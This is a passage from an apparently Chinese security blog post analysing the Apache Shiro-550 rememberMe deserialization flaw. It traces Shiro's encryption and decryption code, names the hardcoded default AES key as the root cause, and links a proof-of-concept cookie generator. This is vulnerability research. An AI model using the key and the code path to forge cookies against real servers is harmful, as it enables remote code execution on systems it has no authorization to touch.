class="hljs-keyword">try</span> {</span><br><span class="line">            ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">            oos.writeObject(o);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="hljs-keyword">return</span> baos.toByteArray();</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (IOException var6) {</span><br><span class="line">            String msg = <span class="hljs-string">&quot;Unable to serialize object [&quot;</span> + o + <span class="hljs-string">&quot;].  &quot;</span> + <span class="hljs-string">&quot;In order for the DefaultSerializer to serialize this object, the [&quot;</span> + o.getClass().getName() + <span class="hljs-string">&quot;] &quot;</span> + <span class="hljs-string">&quot;class must implement java.io.Serializable.&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SerializationException(msg, var6);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// org.apache.shiro.subject.SimplePrincipalCollection#writeObject</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">    out.defaultWriteObject();</span><br><span class="line">    <span class="hljs-keyword">boolean</span> principalsExist = !CollectionUtils.isEmpty(<span class="hljs-keyword">this</span>.realmPrincipals);</span><br><span class="line">    out.writeBoolean(principalsExist);</span><br><span class="line">    <span class="hljs-keyword">if</span> (principalsExist) {</span><br><span class="line">        out.writeObject(<span class="hljs-keyword">this</span>.realmPrincipals);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E;&#x662F;&#x5728; <code>org.apache.shiro.io.DefaultSerializer#serialize</code> &#x7684; <code>toByteArray</code>  &#x8FD4;&#x56DE;&#x7684;&#x5B57;&#x8282;&#x7801;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205211522210.png" alt="image-20201205211522210"></p>
<p>&#x518D;&#x4F9D;&#x6B21;&#x770B;&#x4E00;&#x4E0B;&#x52A0;&#x5BC6;&#x8FD9;&#x4E00;&#x6B65;&#x7684;&#x6B65;&#x9AA4;</p>
<p>&#x5728;&#x770B;&#x8FD9;&#x4E2A;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x5148;&#x770B;&#x5F53;&#x524D;&#x7C7B;&#x7684;&#x6784;&#x9020;&#x65B9;&#x6CD5;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205222540543.png" alt="image-20201205222540543"></p>
<p>&#x8BBE;&#x7F6E; AES &#x7684;&#x5404;&#x4E2A;&#x4FE1;&#x606F; <code>org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService</code></p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205225320439.png" alt="image-20201205225320439"></p>
<p>&#x8FDB;&#x5165;&#x52A0;&#x5BC6;&#x6B65;&#x9AA4;</p>
<p>&#x7B2C;&#x4E00;&#x90E8;&#x5206;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">// org.apache.shiro.mgt.AbstractRememberMeManager.convertPrincipalsToBytes</span></span><br><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.getCipherService() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">        bytes = <span class="hljs-keyword">this</span>.encrypt(bytes);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</span></span><br><span class="line"><span class="hljs-comment">* &#x540E;&#x9762;&#x5148;&#x8FDB;&#x5165; this.getCipherService(); &#x7684;&#x5206;&#x6790;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] encrypt(<span class="hljs-keyword">byte</span>[] serialized) {</span><br><span class="line">    <span class="hljs-keyword">byte</span>[] value = serialized;</span><br><span class="line">    CipherService cipherService = <span class="hljs-keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// org.apache.shiro.mgt.AbstractRememberMeManager#getCipherService</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> CipherService <span class="hljs-title">getCipherService</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.cipherService;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"><span class="hljs-comment"> * &#x8FD9;&#x4E2A;&#x662F;&#x5728;&#x8BE5;&#x7C7B;&#x8C03;&#x7528;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x9644;&#x503C;&#x7684;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractRememberMeManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RememberMeManager</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">private</span> CipherService cipherService = <span class="hljs-keyword">new</span> AesCipherService();</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// org.apache.shiro.crypto.AesCipherService</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AesCipherService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DefaultBlockCipherService</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String ALGORITHM_NAME = <span class="hljs-string">&quot;AES&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AesCipherService</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">super</span>(<span class="hljs-string">&quot;AES&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DefaultBlockCipherService</span><span class="hljs-params">(String algorithmName)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">super</span>(algorithmName);</span><br><span class="line">    <span class="hljs-keyword">this</span>.modeName = OperationMode.CBC.name();</span><br><span class="line">    <span class="hljs-keyword">this</span>.paddingSchemeName = PaddingScheme.PKCS5.getTransformationName();</span><br><span class="line">    <span class="hljs-keyword">this</span>.blockSize = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">this</span>.streamingModeName = OperationMode.CBC.name();</span><br><span class="line">    <span class="hljs-keyword">this</span>.streamingPaddingSchemeName = PaddingScheme.PKCS5.getTransformationName();</span><br><span class="line">    <span class="hljs-keyword">this</span>.streamingBlockSize = <span class="hljs-number">8</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</span></span><br><span class="line"><span class="hljs-comment">* &#x8FD0;&#x884C;&#x521A;&#x521A;&#x8FD9;&#x4E2A;&#x7C7B;&#x7684;&#x540E;&#x534A;&#x90E8;&#x5206;</span></span><br><span class="line"><span class="hljs-comment">* &#x8FD9;&#x91CC; cipherService &#x786E;&#x5B9A;&#x4E86;&#x52A0;&#x5BC6;&#x7C7B;&#x578B;&#x7B49;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] encrypt(<span class="hljs-keyword">byte</span>[] serialized) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) {</span><br><span class="line">        ByteSource byteSource = cipherService.encrypt(serialized, <span class="hljs-keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD9;&#x91CC;&#x5148;&#x770B;  <code>getEncryptionCipherKey</code> &#x65B9;&#x6CD5;&#x7684;&#x8C03;&#x7528;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey</span></span><br><span class="line"><span class="hljs-comment">* &#x8FD9;&#x91CC;&#x7684; this.encryptionCipherKey &#x662F;&#x4E4B;&#x524D;&#x7C7B;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x5B9A;&#x4E49;&#x7684;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getEncryptionCipherKey() {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.encryptionCipherKey;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x56DE;&#x987E;&#x7C7B;&#x7684;&#x521D;&#x59CB;&#x5316;</span></span><br><span class="line"><span class="hljs-comment">* org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager</span></span><br><span class="line"><span class="hljs-comment">* &#x6CE8;&#x610F; DEFAULT_CIPHER_KEY_BYTES&#xFF0C;&#x5176;&#x5B9E;&#x662F;&#x4E4B;&#x524D; private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;); &#x5DF2;&#x7ECF;&#x786C;&#x7F16;&#x7801;&#x597D;&#x7684;&#x3002; &#x8FD9;&#x662F;&#x6F0F;&#x6D1E;&#x7684;&#x6839;&#x6E90;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AbstractRememberMeManager</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCipherKey</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] cipherKey)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">this</span>.setEncryptionCipherKey(cipherKey);</span><br><span class="line">    <span class="hljs-keyword">this</span>.setDecryptionCipherKey(cipherKey);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEncryptionCipherKey</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] encryptionCipherKey)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">this</span>.encryptionCipherKey = encryptionCipherKey;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7B2C;&#x4E8C;&#x90E8;&#x5206; &#x7136;&#x540E;&#x662F; <code>encrypt</code> &#x65B9;&#x6CD5; &#xFF08;&#x6838;&#x5FC3; AES &#x52A0;&#x5BC6;&#xFF09;</p>
<p>&#x4F20;&#x5165;&#x7684;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x4E00;&#x4E2A;&#x662F;&#x521A;&#x521A;&#x5728; <code>org.apache.shiro.io.DefaultSerializer#serialize</code> &#x7684; <code>toByteArray</code>  &#x8FD4;&#x56DE;&#x7684;&#x5B57;&#x8282;&#x7801;&#x3002;&#x53E6;&#x4E00;&#x4E2A;&#x5C31;&#x662F; AES KEY</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205232236114.png" alt="image-20201205232236114"></p>
<p>&#x540E;&#x9762;&#x7684;&#x5C31;&#x662F; AES &#x52A0;&#x5BC6;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C; &#x6700;&#x540E;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; bytes</p>
<p>&#x7B2C;&#x4E09;&#x90E8;&#x5206;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x8FD4;&#x56DE; org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</span></span><br><span class="line"><span class="hljs-comment">* bytes &#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x7ECF;&#x8FC7; encrypt &#x52A0;&#x5BC6;&#x7684;&#x503C;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rememberIdentity</span><span class="hljs-params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="hljs-keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</span></span><br><span class="line"><span class="hljs-comment">* base64 &#x52A0;&#x5BC6;</span></span><br><span class="line"><span class="hljs-comment">* &#x8BBE;&#x7F6E; cookie </span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rememberSerializedIdentity</span><span class="hljs-params">(Subject subject, <span class="hljs-keyword">byte</span>[] serialized)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subject)) {</span><br><span class="line">        &#xB7;&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">        HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line">        String base64 = Base64.encodeToString(serialized);</span><br><span class="line">        Cookie template = <span class="hljs-keyword">this</span>.getCookie();</span><br><span class="line">        Cookie cookie = <span class="hljs-keyword">new</span> SimpleCookie(template);</span><br><span class="line">        cookie.setValue(base64);</span><br><span class="line">        cookie.saveTo(request, response);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205234932955.png" alt="image-20201205234932955"></p>
<p>&#x5B8C;&#x6210;&#x4E86; &#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61; -&gt; AES &#x52A0;&#x5BC6; -&gt; Base64 &#x52A0;&#x5BC6; -&gt; &#x8BBE;&#x7F6E; cookie &#x503C; &#x7684;&#x8FC7;&#x7A0B;</p>
<h2 id="&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;"><a href="#&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;" class="headerlink" title="&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;"></a>&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;</h2><p>POC &#x751F;&#x6210;&#xFF1A;<a href="https://github.com/P2hm1n/vulnExploit/blob/main/shiro_rememberMe_generate.py" target="_blank" rel="noopener">https://github.com/P2hm1n/vulnExploit/blob/main/shiro_rememberMe_generate.py</a></p>
<p>&#x4ECE; POC &#x7684;&#x89E6;&#x53D1;&#x6765;&#x770B;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">// org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">getRememberedIdentity</span><span class="hljs-params">(SubjectContext subjectContext)</span> </span>{</span><br><span class="line">    RememberMeManager rmm = <span class="hljs-keyword">this</span>.getRememberMeManager();</span><br><span class="line">    <span class="hljs-keyword">if</span> (rmm != <span class="hljs-keyword">null</span>) {</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            <span class="hljs-keyword">return</span> rmm.getRememberedPrincipals(subjectContext);</span><br><span class="line">    &#xB7;&#xB7;&#xB7;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x4E0A;&#x9762; return &#x8C03;&#x7528; org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> PrincipalCollection <span class="hljs-title">getRememberedPrincipals</span><span class="hljs-params">(SubjectContext subjectContext)</span> </span>{</span><br><span class="line">    PrincipalCollection principals = <span class="hljs-keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">try</span> {</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">this</span>.getRememberedSerializedIdentity(subjectContext);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x4E0A;&#x9762;&#x8C03;&#x7528; org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) {</span><br><span class="line">    &#xB7;&#xB7;&#xB7;</span><br><span class="line">            String base64 = <span class="hljs-keyword">this</span>.getCookie().readValue(request, response);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x4E0A;&#x9762;&#x8C03;&#x7528; org.apache.shiro.web.servlet.SimpleCookie#readValue</span></span><br><span class="line"><span class="hljs-comment">* &#x5173;&#x952E;&#x51FD;&#x6570; readValue &#x8FD4;&#x56DE; rememberMe &#x7684; POC &#x503C;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">readValue</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse ignored)</span> </span>{</span><br><span class="line">    <span class="hljs-comment">// &#x83B7;&#x53D6;&#x5230;&#x4E86;&#x4F20;&#x5165;&#x7684; cookie &#x7684;&#x540D;&#x5B57; name: &quot;rememberMe&quot;</span></span><br><span class="line">    String name = <span class="hljs-keyword">this</span>.getName();</span><br><span class="line">    String value = <span class="hljs-keyword">null</span>;</span><br><span class="line">    <span class="hljs-comment">// &#x8FD9;&#x91CC;&#x83B7;&#x53D6;&#x5230; rememberMe &#x5BF9;&#x5E94;&#x7684;&#x503C;</span></span><br><span class="line">    javax.servlet.http.Cookie cookie = getCookie(request, name);</span><br><span class="line">    <span class="hljs-keyword">if</span> (cookie != <span class="hljs-keyword">null</span>) {</span><br><span class="line">        value = cookie.getValue();</span><br><span class="line">        log.debug(<span class="hljs-string">&quot;Found &apos;{}&apos; cookie value [{}]&quot;</span>, name, value);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        log.trace(<span class="hljs-string">&quot;No &apos;{}&apos; cookie value&quot;</span>, name);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">// &#x8FD4;&#x56DE; rememberMe &#x7684;&#x503C;</span></span><br><span class="line">    <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x8DF3;&#x56DE; org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</span></span><br><span class="line"><span class="hljs-comment">* &#x5173;&#x952E;&#x70B9;&#xFF1A;&#x4F1A;&#x8FDB;&#x884C;base64&#x89E3;&#x7801;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) {</span><br><span class="line">    &#xB7;&#xB7;&#xB7;</span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;deleteMe&quot;</span>.equals(base64)) {</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (base64 != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                <span class="hljs-comment">// &#x786E;&#x5B9E;&#x662F;&#x5426;&#x662F;base64</span></span><br><span class="line">                base64 = <span class="hljs-keyword">this</span>.ensurePadding(base64);</span><br><span class="line">            &#xB7;&#xB7;&#xB7;</span><br><span class="line">                <span class="hljs-keyword">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">            &#xB7;&#xB7;&#xB7;</span><br><span class="line">                <span class="hljs-keyword">return</span> decoded;</span><br><span class="line">            } <span class="hljs-keyword">else</span> {</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x8DF3;&#x56DE; org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</span></span><br><span class="line"><span class="hljs-comment">* &#x6B64;&#x65F6;&#x5DF2;&#x7ECF;&#x5C06; base64 &#x8FDB;&#x884C;&#x4E86;&#x89E3;&#x7801;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> PrincipalCollection <span class="hljs-title">getRememberedPrincipals</span><span class="hljs-params">(SubjectContext subjectContext)</span> </span>{</span><br><span class="line">    &#xB7;&#xB7;&#xB7;</span><br><span class="line">            principals = <span class="hljs-keyword">this</span>.convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x8C03;&#x7528; org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">convertBytesToPrincipals</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.getCipherService() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">        bytes = <span class="hljs-keyword">this</span>.decrypt(bytes);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x8C03;&#x7528; org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</span></span><br><span class="line"><span class="hljs-comment">* &#x5173;&#x952E;&#x70B9;&#xFF1A; &#x8FDB;&#x884C; AES &#x89E3;&#x5BC6;&#xFF0C; &#x5E76;&#x8FD4;&#x56DE;&#x89E3;&#x5BC6;&#x503C;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] decrypt(<span class="hljs-keyword">byte</span>[] encrypted) {</span><br><span class="line">    <span class="hljs-keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = <span class="hljs-keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) {</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, <span class="hljs-keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> serialized;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x8FD4;&#x56DE; org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</span></span><br><span class="line"><span class="hljs-comment">* &#x6B64;&#x5904;&#x8C03;&#x7528; deserialize</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">convertBytesToPrincipals</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>{</span><br><span class="line">  &#xB7;&#xB7;&#xB7;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.deserialize(bytes);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x8C03;&#x7528; org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] serializedIdentity)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> (PrincipalCollection)<span class="hljs-keyword">this</span>.getSerializer().deserialize(serializedIdentity);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment">* &#x8C03;&#x7528; org.apache.shiro.io.DefaultSerializer#deserialize</span></span><br><span class="line"><span class="hljs-comment">* &#x6700;&#x7EC8;&#x5173;&#x952E;&#x70B9;&#xFF1A;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> SerializationException </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (serialized == <span class="hljs-keyword">null</span>) {</span><br><span class="line">        String msg = <span class="hljs-string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(msg);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        BufferedInputStream bis = <span class="hljs-keyword">new</span> BufferedInputStream(bais);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            ObjectInputStream ois = <span class="hljs-keyword">new</span> ClassResolvingObjectInputStream(bis);</span><br><span class="line">            T deserialized = ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            <span class="hljs-keyword">return</span> deserialized;</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (Exception var6) {</span><br><span class="line">            String msg = <span class="hljs-string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SerializationException(msg, var6);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span 